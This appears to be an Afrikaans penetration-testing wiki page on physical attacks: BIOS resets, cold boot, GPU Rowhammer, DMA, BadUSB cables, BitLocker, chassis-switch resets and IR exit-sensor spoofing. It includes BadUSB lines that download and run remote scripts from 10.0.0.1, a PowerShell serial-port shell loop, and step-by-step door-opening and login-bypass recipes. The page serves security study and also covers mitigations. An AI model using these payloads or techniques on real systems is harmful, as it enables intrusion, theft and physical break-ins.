# Fisiese aanvalle

{{#include ../banners/hacktricks-training.md}}

## BIOS-wagwoordherstel en stelselsekuriteit

Ouer rekenaarfirmware-instellings kan teruggestel word deur die CMOS-battery te ontkoppel of ’n gedokumenteerde clear-CMOS-jumper te gebruik. Die nodige afskakeltyd hang van die moederbord af, en moderne UEFI-wagwoorde of -sleutels kan in nievlugtige flitsgeheue, ’n ingebedde beheerder of ’n sekuriteitstoestel gestoor wees en dus behoue bly nadat ’n battery verwyder is. Raadpleeg die moederbord-/dienshandleiding voordat jy penne kortsluit; hierdie prosedure kan ook TPM-metings ongeldig maak en skyfenkripsieherstel aktiveer.

Op ouer x86-stelsels kan nutsprogramme soos **killCMOS** en **CmosPwd** CMOS-gesteunde instellings vanuit ’n selflaaibare omgewing ondersoek of verander. CmosPwd herken wagwoordformate van ’n gedokumenteerde stel ouer BIOS-families en kan CMOS-toestand rugsteun, herstel of uitvee/doodmaak; die gepubliseerde weergawes is gemik op ouer DOS-/Windows-, Linux-, FreeBSD- en NetBSD-omgewings.<sup>[[18]](#references)</sup> Hierdie nutsprogramme is nie algemene UEFI-wagwoordverwyderaars nie en vereis voldoende hardeware-/firmwaretoegang.

Sommige skootrekenaarfirmware vertoon ’n verskafferspesifieke uitdagingskode ná verskeie mislukte wagwoordpogings. Databasisse soos [bios-pw.org](https://bios-pw.org) kan vir sommige modelle ouer verskafferherstelwagwoorde aflei, maar baie stelsels sluit toegang sonder ’n afleibare uitdaging. Beskou enige gegenereerde wagwoord as modelspesifiek en vermy dat permanente pogingtellers uitgeput raak.

### UEFI-sekuriteit

Vir moderne **UEFI**-stelsels kan CHIPSEC Secure Boot-veranderlikebeskerming oudit. Begin met die nie-wysigende kontrole hieronder; die opsionele `-a modify`-modus probeer doelbewus veranderlikes beskadig en moet slegs op ’n laboratoriumstelsel gebruik word wat herstel kan word. CHIPSEC waarsku self dat sy bevoorregte drywer en laevlak-hardewaretoegang nie geskik is vir produksie-eindpunte nie.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM-analise en Cold Boot-aanvalle

DRAM verloor nie elke bis onmiddellik wanneer verfrissing stop nie. Die vervaltempo wissel aansienlik na gelang van moduletegnologie en temperatuur; verkoeling kan nuttige data baie langer bewaar as ’n onverkoelde kragsiklus. ’n Cold-boot-aanval herlaai vinnig na ’n klein verkrygingsomgewing of dra ’n verkoelde module oor, neem ’n rou geheuestorting vas en rekonstrueer kriptografiese sleutels ondanks bisverval. ’n Skyfkopieerhulpmiddel is nie outomaties ’n fisiese geheuebeeldingshulpmiddel nie, en Volatility ontleed ’n vaslegging eerder as om dit te verkry; gebruik ’n platformgeskikte, gevalideerde verkrygingshulpmiddel.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer teen bladsytafels

Moderne GPU Rowhammer-aanvalle word baie nuttiger wanneer hulle **GPU-virtuele geheue-metadata** teiken in plaas van gewone buffers. Onlangse werk oor **GDDR6 NVIDIA Ampere-GPU’s** toon dat ’n aanvaller wat ongeprivilegieerde CUDA-kode uitvoer GPU-spesifieke hamerpatrone kan bou, **geheuemassering** kan gebruik om bladsystrukture in kwesbare rye te plaas, en dan bisse in die **laastevlak-bladsytafel** of ’n intermediêre **bladsygids** kan omkeer. Sodra ’n enkele vertaalinskrywing beskadig is, kan die aanvaller **arbitrêre GPU-geheue-lees-/skryftoegang** verkry en daarna na ’n kompromittering van die gasheer oorskakel.<sup>[[1]](#references)[[2]](#references)</sup>

### Uitbuitingspatroon

1. **Profilering van rye wat gehamer kan word** in GDDR6 en bou verfrissingsbewuste / nie-eenvormige hamerpatrone wat in-DRAM-versagtingsmaatreëls omseil.
2. **Masseer GPU-toekennings** sodat die drywer bladsyvertalingstrukture in hamerbare fisiese liggings plaas, eerder as om dit in die verstekbeskermde poel te hou. In die praktyk kan dit beteken dat die laegeheue-bladsytafelstreek uitgeput word en groot yl UVM-afbeeldings met beheerde treë versprei word.
3. **Keer vertaalmetadata om**, soos **PFN**- of apertuurverwante bisse binne ’n bladsytafel-/bladsygidsinskrywing, sodat die aanvallerbeheerde virtuele bladsy na bladsytafelbladsye, arbitrêre GPU-geheue of gasheersigbare stelselafbeeldings verwys.
4. Hergebruik die vervalste afbeelding om bykomende vertaalinskrywings te herskryf en eskaleer na **arbitrêre GPU-geheue-lees-/skryftoegang** oor GPU-kontekste heen.

### Gasheeroorskakeling en versagtingsmaatreëls

- Wanneer **IOMMU gedeaktiveer is**, kan vervalste stelselapertuura afbeeldings arbitrêre **gasheerfisiese geheue** aan die GPU blootstel, wat die GPU-primitief in ’n volledige kompromittering van die gasheer omskep.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** teiken laastevlak-bladsytafelinskrywings, terwyl **GeForge** wys dat dit makliker kan wees om ’n bladsygidshiërargievlak te beskadig, omdat een bisomkering ’n groter vertaal-subboom kan herteiken. Moenie net een bladsyvlak as sekuriteitskrities beskou nie.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** is steeds belangrik omdat dit die direkte arbitrêre-gasheergeheuepad blokkeer wat GDDRHammer/GeForge gebruik, maar dit is **nie ’n volledige versagtingsmaatreël nie**. **GPUBreach** toon ’n tweedefase-oorskakeling waarin die aanvaller GPU-skryfbare, drywereienaarskap-CPU-buffers beskadig en dan geheueveiligheidsfoute in die NVIDIA-drywer aktiveer om ’n kernskryfprimitief en ’n **root shell** te verkry, selfs met IOMMU geaktiveer.<sup>[[3]](#references)</sup>
- **Stelselvlak-ECC** is ’n praktiese verhardingsmaatreël op ondersteunde werkstasie-/bediener-GPU’s. Verbruikers-GPU’s sonder ECC bied ’n swakker verdedigingsoppervlak.<sup>[[4]](#references)</sup>
- Hierdie aanvalle is nie bloot teoreties nie: **GeForge** het **1,171** bisomkerings op ’n RTX 3060 en **202** op ’n RTX A6000 gerapporteer, genoeg om ’n werkende ketting vir die eskalering van gasheervoorregte te bou.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direkte geheuetoegang-aanvalle (DMA)

Vir vanlyn UEFI IFR/NVRAM-pleisterwerk wat voorlaai-IOMMU-afdwinging kan afgradeer en ’n Windows DMA-ketting kan aktiveer, sien:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstreer **DMA-gebaseerde geheueverkryging en pleisterwerk** oor koppelvlakke soos FireWire en vroeë Thunderbolt-konfigurasies, insluitend historiese aanmeldingsomseilhandtekeninge. Dit is nie bloot “ondoeltreffend teen Windows 10” nie: uitbuitbaarheid hang af van die koppelvlak, teikenbou, IOMMU-beleid, sluitstatus en of Windows Kernel DMA Protection ondersteun en geaktiveer is. Windows 10 weergawe 1803 en later het Kernel DMA Protection op versoenbare platforms bekendgestel, wat die aanvaloppervlak aansienlik verander het.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB vir stelseltoegang

Op ’n ongeënkripteerde of reeds ontsluite Windows-volume kan ’n vanlyn omgewing toeganklikheidsprogramme soos **sethc.exe** of **Utilman.exe** met **cmd.exe** vervang, wat ’n SYSTEM-opdragprompt oplewer wanneer die ooreenstemmende kortpad op die aanmeldskerm gebruik word. Gereedskap soos **chntpw** kan plaaslike SAM-rekeningdata wysig. Hierdie metodes omseil nie ’n geslote BitLocker-volume nie en kan geloofsbriewe wat deur DPAPI/EFS beskerm word, beskadig; bewaar forensiese kopieë en rugsteune.

**Kon-Boot** is ’n kommersiële hulpmiddel vir die omseiling van aanmeldstawing tydens selflaai op ondersteunde Windows-/macOS-konfigurasies. Verenigbaarheid hang af van die bedryfstelsel, firmwaremodus, Secure Boot en skyfenkripsie-opstelling; dit dekripteer nie ’n BitLocker-geslote volume nie.<sup>[[10]](#references)</sup>

---

## Hantering van Windows-sekuriteitskenmerke

### Selflaai- en herstelkortpaaie

- **Delete/Supr**, F2, F10 of ’n ander verskaffersleutel kan die firmware-opstelling oopmaak.
- **F8** open slegs die verouderde Windows-gevorderde selflaaiopsies op konfigurasies waar daardie roete steeds geaktiveer is; die huidige hersteltoegang verskil.
- Deur **Shift** in te hou, kan Windows se outomatiese aanmelding in sommige konfigurasies onderdruk word, hoewel beleids-/registerinstellings daardie gedrag kan deaktiveer.<sup>[[17]](#references)</sup>

### BAD USB-toestelle

Toestelle soos **USB Rubber Ducky** en Teensy-borde kan as vertroude HID-sleutelborde geïdentifiseer word en voorafbepaalde toetsaanslae invoer. Die loonvrag het aanvanklik die voorregte en lessenaartoegang van die aangemelde sessie; UAC-aanwysings, skermsluiting, sleutelborduitleg, tydsberekening en USB-beleid op eindpunte beperk dit steeds.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrateur- of rugsteunvoorregte kan ’n skadukopie skep of registerkorwe stoor sodat geslote lêers soos **SAM** en **SYSTEM** verkry kan word. Dit is ’n versamelingstegniek ná kompromittering, nie ’n voorregomseiling nie, en moet met `diskshadow`-/VSS- en registerkorf-uitvoer-gebeurtenisse gekorreleer word.

## BadUSB / HID-inplantingstegnieke

### Wi-Fi-beheerde kabelinplantings

- ESP32-S3-gebaseerde inplantings soos **Evil Crow Cable Wind** skuil in USB-A→USB-C- of USB-C↔USB-C-kabels, identifiseer uitsluitlik as ’n USB-sleutelbord en stel hul C2-stapel oor Wi-Fi beskikbaar. Die operateur hoef net die kabel van die slagoffer se gasheer af aan te dryf, ’n hotspot met die naam `Evil Crow Cable Wind` en wagwoord `123456789` te skep, en na [http://cable-wind.local/](http://cable-wind.local/) (of sy DHCP-adres) te blaai om die ingebedde HTTP-koppelvlak te bereik.<sup>[[8]](#references)</sup>
- Die blaaier-UI bied oortjies vir *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* en *Config*. Gestoorde loonvragte word volgens bedryfstelsel gemerk, sleutelborduitlegte word onmiddellik omgeskakel en VID/PID-stringe kan verander word om bekende randtoestelle na te boots.
- Omdat die C2 binne die kabel is, kan ’n foon loonvragte gereedmaak, uitvoering aktiveer en Wi-Fi-bewyse bestuur sonder om die organisasie se netwerk te gebruik—nuttig vir fisiese indringings met ’n kort verblyftyd.

### OS-bewuste AutoExec-loonvragte

- AutoExec-reëls koppel een of meer loonvragte om onmiddellik ná USB-identifisering uit te voer. Die inplanting doen liggewig-OS-vingerafdrukke en kies die ooreenstemmende skrip.
- Voorbeeldwerkvloei:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) of `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Omdat uitvoering sonder toesig plaasvind, kan bloot die omruil van ’n laaikabel aanvanklike toegang verkry deur “plug-and-pwn” onder die aangemelde gebruiker se konteks.

### HID-geïnisieerde afgeleë dop oor Wi-Fi TCP

1. **Toetsaanslag-inisialisering:** ’n Gestoorde loonvrag open ’n konsole en plak ’n lus wat enigiets uitvoer wat op die nuwe USB-reekstoestel aankom. ’n Minimale Windows-variant is:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Kabelbrug:** Die implant hou die USB CDC-kanaal oop terwyl sy ESP32-S3 ’n TCP-kliënt (Python-skrip, Android APK of rekenaartoepassing) terug na die operateur begin. Enige grepe wat in die TCP-sessie ingetik word, word na die seriële lus hierbo aangestuur, wat afstandbeheer van opdragte moontlik maak, selfs op gassisoleerde gashere. Uitvoer is beperk, daarom voer operateurs gewoonlik opdragte blindelings uit (soos om rekeninge te skep, bykomende nutsmiddels gereed te maak, ens.).

### HTTP OTA-opdateringsoppervlak

- Die gedokumenteerde Evil Crow Cable Wind-koppelvlak stel ’n ongeverifieerde firmware-opdaterings-eindpunt by `/update` bloot:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Veldoperateurs kan kenmerke onmiddellik omruil (bv. USB Army Knife-firmware flash) tydens ’n operasie sonder om die kabel oop te maak, sodat die implant na nuwe vermoëns kan oorskakel terwyl dit steeds by die teikenhost ingeprop is.

## Om BitLocker-enkripsie te omseil

’n Gemagtigde forensiese verkryging van ’n lewendige of onlangs lopende stelsel kan ’n BitLocker-volumehoofsleutel of verwante sleutelmateriaal bevat terwyl die volume ontsluit is. Kommersiële nutsmiddels soos Elcomsoft Forensic Disk Decryptor en Passware Kit Forensic kan ondersteunde geheuebeelde, hibernasielêers of ongelukstortings deursoek, maar sukses is nie gewaarborg nie. Moderne Windows enkripteer ook ongelukstortings wanneer BitLocker geaktiveer is, en ’n gestoorde 48-syfer-herstelwagwoord is ’n ander artefak as ’n volumesleutel in die geheue.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering om ’n herstelsleutel by te voeg

’n Aanvaller wat ’n administrateur oorreed om BitLocker-bestuuropdragte uit te voer, kan ’n herstelwagwoord, eksterne sleutel of ander beskermer byvoeg en dit dan vaslê. ’n Herstelwagwoord kan nie ’n arbitrêre string nulle wees nie: BitLocker-numeriese herstelwagwoorde het ’n gevalideerde 48-syferformaat. Die toepaslike sintaksis vir gemagtigde administrasie is `manage-bde -protectors -add C: -recoverypassword`; lys die gevolglike beskermers met `manage-bde -protectors -get C:`. Monitor die byvoeging van beskermers en verseker dat nuwe herstelmateriaal slegs na goedgekeurde liggings gestoor word.<sup>[[16]](#references)</sup>

---

## Gebruik onderstelindringing-/instandhoudingskakelaars om die BIOS na fabrieksinstellings terug te stel

Baie moderne skootrekenaars en klein-rekenaaronderstel-rekenaars sluit ’n **onderstelindringingskakelaar** in wat deur die Embedded Controller (EC) en die BIOS/UEFI-firmware gemonitor word. Hoewel die skakelaar hoofsaaklik ’n waarskuwing moet gee wanneer ’n toestel oopgemaak word, implementeer vervaardigers soms ’n **ongedokumenteerde herstelkortpad** wat geaktiveer word wanneer die skakelaar in ’n spesifieke patroon geskakel word.<sup>[[5]](#references)[[6]](#references)</sup>

### Hoe die aanval werk

1. Die skakelaar is aan ’n **GPIO-onderbreking** op die EC gekoppel.
2. Firmware wat op die EC loop, hou tred met die **tydsberekening en aantal drukke**.
3. Wanneer ’n hardgekodeerde patroon herken word, roep die EC ’n *mainboard-reset*-roetine aan wat **die inhoud van die stelsel se NVRAM/CMOS uitwis**.
4. Met die volgende selflaai laai die betrokke modelle teruggestelde firmwaretoestand. Afhangend van die vervaardiger en hersiening, kan die uitgevee toestand ’n toesighouerwagwoord, pasgemaakte selflaaiinstellings of ingeskrewe Secure Boot-sleutels insluit; TPM-toestand en gevolge vir skyfenkripsie moet afsonderlik beoordeel word.

> ’n Firmware-terugstelling kan selflaai vanaf eksterne media weer moontlik maak, maar dit **dekripteer nie berging nie**. BitLocker of ’n ander volledige-skyfenkripsiestelsel kan ná veranderinge aan TPM/firmware herstelmodus betree en steeds die interne skyf beskerm sonder ’n herstelsleutel.<sup>[[16]](#references)</sup>

### Werklike voorbeeld – Framework 13-skootrekenaar

Die herstelkortpad vir die Framework 13 (11de/12de/13de generasie) is:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Ná die tiende siklus stel die EC ’n vlag wat die BIOS opdrag gee om NVRAM met die volgende herlaaiing uit te vee. Die hele prosedure neem ongeveer 40 s en vereis **niks behalwe ’n skroewedraaier nie**.<sup>[[5]](#references)</sup>

### Generiese uitbuitingsprosedure

1. Skakel die teiken aan of laat dit uit slaap hervat sodat die EC loop.
2. Verwyder die onderdeksel om die indringing-/onderhoudskakelaar bloot te lê.
3. Herhaal die verskafferspesifieke wisselpatroon (raadpleeg dokumentasie of forums, of reverse-engineer die EC-firmware).
4. Sit die toestel weer aanmekaar en herlaai dit; kyk dan watter firmware-instellings en geloofsbriewe werklik verander het.
5. Indien dit gemagtig is en eksterne selflaai beskikbaar is, selflaai ’n beheerde lewendige beeld. Sodra ’n interne volume wettig ontsluit is (of as dit nooit geënkripteer was nie), kan die lewendige omgewing geloofsbriewe en data bekom, of die EFI-stelselpartisie inspekteer. Om daardie partisie te wysig om ’n EFI-implantaat te installeer, is aanhoudend en hoogs indringend, en bly beperk deur Secure Boot, gemete selflaai, firmware-skryfbeskerming en eindpuntmonitering. Geënkripteerde berging bly ontoeganklik sonder die sleutel of herwinningsmateriaal.

### Opsporing en versagting

* Teken onderstel-indringingsgebeure in die OS-bestuurskonsole aan en korreleer dit met onverwagte BIOS-terugstellings.
* Gebruik **peuterduidelike seëls** op skroewe/deksels om te sien of dit oopgemaak is.
* Hou toestelle in **fisies beheerde areas**; aanvaar dat fisiese toegang gelykstaande is aan volledige kompromittering.
* Waar beskikbaar, deaktiveer die verskaffer se “maintenance switch reset”-funksie of vereis bykomende kriptografiese magtiging vir NVRAM-terugstellings.

---

## Verborge IR-inspuiting teen geen-aanraak-uittreesensors

### Sensoreienskappe
- Kommoditeitsensors van die “waai-om-uit-te-gaan”-tipe koppel ’n naby-IR-LED-sender aan ’n TV-afstandbeheeragtige ontvangermodule, wat slegs logiese hoog rapporteer nadat dit verskeie pulse (~4–10) van die korrekte draer (≈30 kHz) waargeneem het.<sup>[[7]](#references)</sup>
- ’n Plastiekomhulsel keer dat die sender en ontvanger direk na mekaar kyk, en daarom aanvaar die beheerder dat enige gevalideerde draer van ’n nabygeleë weerkaatsing afkomstig is en aktiveer dit ’n aflos wat die deur se sluitplaat oopmaak.
- Sodra die beheerder glo dat ’n teiken teenwoordig is, verander dit dikwels die uitgaande modulasie-omhulsel, maar die ontvanger aanvaar steeds enige sarsie wat by die gefiltreerde draer pas.

### Aanvalswerkvloei
1. **Teken die emissieprofiel vas** – koppel ’n logikaanaliseerder oor die beheerderpenne om die golfvorms voor en ná opsporing op te neem wat die interne IR-LED aandryf.
2. **Herhaal slegs die “ná-opsporings”-golfvorm** – verwyder/ignoreer die standaard-sender en dryf ’n eksterne IR-LED met die reeds-geaktiveerde patroon van die begin af. Omdat die ontvanger net omgee vir pulstelling/-frekwensie, beskou dit die vervalste draer as ’n egte weerkaatsing en aktiveer dit die afloslyn.
3. **Beheer die uitsending** – stuur die draer in ingestelde sarsies uit (bv. tientalle millisekondes aan, ’n soortgelyke tyd af) om die minimum pulstelling te lewer sonder om die ontvanger se AGC of steuringshanteringslogika te oorlaai. Deurlopende uitsending maak die sensor vinnig minder sensitief en keer dat die aflos aktiveer.

### Weerkaatsende inspuiting oor lang afstande
- Deur die toetsbank-LED met ’n hoëkrag-IR-diode, MOSFET-aandrywer en fokusoptika te vervang, kan dit betroubaar van ~6 m afstand geaktiveer word.
- Die aanvaller het nie ’n siglyn na die ontvangeropening nodig nie; as die straal op binnemure, rakke of deurkosyne gerig word wat deur glas sigbaar is, kan weerkaatste energie die ~30°-gesigsveld binnedring en ’n nabygeleë handwaai naboots.
- Omdat die ontvangers slegs swak weerkaatsings verwag, kan ’n veel sterker eksterne straal van verskeie oppervlaktes af weerkaats en steeds bo die opsporingsdrempel bly.

### Gewapende aanvalflitslig
- Deur die aandrywer in ’n kommersiële flitslig in te bou, word die hulpmiddel in die volle sig versteek. Vervang die sigbare LED met ’n hoëkrag-IR-LED wat by die ontvanger se band pas, voeg ’n ATtiny412 (of soortgelyk) by om die ≈30 kHz-sarsies te genereer, en gebruik ’n MOSFET om die LED-stroom af te voer.
- ’n Teleskopiese zoomlens vernou die straal vir reikafstand/presisie, terwyl ’n vibrasiemotor onder MCU-beheer haptiese bevestiging gee dat modulasie aktief is, sonder om sigbare lig uit te straal.
- Deur verskeie gestoorde modulasiepatrone (effens verskillende draerfrekwensies en omhulsels) te deurloop, verbeter versoenbaarheid oor herbenoemde sensorfamilies heen. Dit laat die gebruiker weerkaatsende oppervlaktes afsoek totdat die aflos hoorbaar klik en die deur oopgaan.

---

## References

- [1] [GDDRHammer: DRAM-rye grootliks versteur — Rowhammer-aanvalle oor komponente heen vanaf moderne GPU’s](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR-geheue hamerslaan om GPU-bladsytabelle vir pret en wins te vervals](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Voorregte-eskalasie-aanvalle op GPU’s met Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Sekuriteitskennisgewing: Rowhammer - Julie 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Druk hier om te pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Gids vir moederbordterugstelling](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Neeeee, raak dit nie aan nie! – Omseiling van IR-no-aanraak-uittreesensors met ’n verborge IR-fakkel”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Koppel in, speel, pwn: Inbraak met Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer-aanval teen NVIDIA-skyfies](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Amptelike dokumentasie en versoenbaarheidsinligting van Kon-Boot](https://kon-boot.com/)
- [11] [CHIPSEC-dokumentasie - Secure Boot-veranderlikebeskerming](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [As ons maar kon onthou: Koue-selflaai-aanvalle op enkripsiesleutels](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - Fisiese geheuemanipulasie oor DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA-beskerming](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky-dokumentasie](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker-bewerkingsgids](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Hoe Shift inhou en outomatiese aanmelding werk](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd-dokumentasie en aflaaie](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
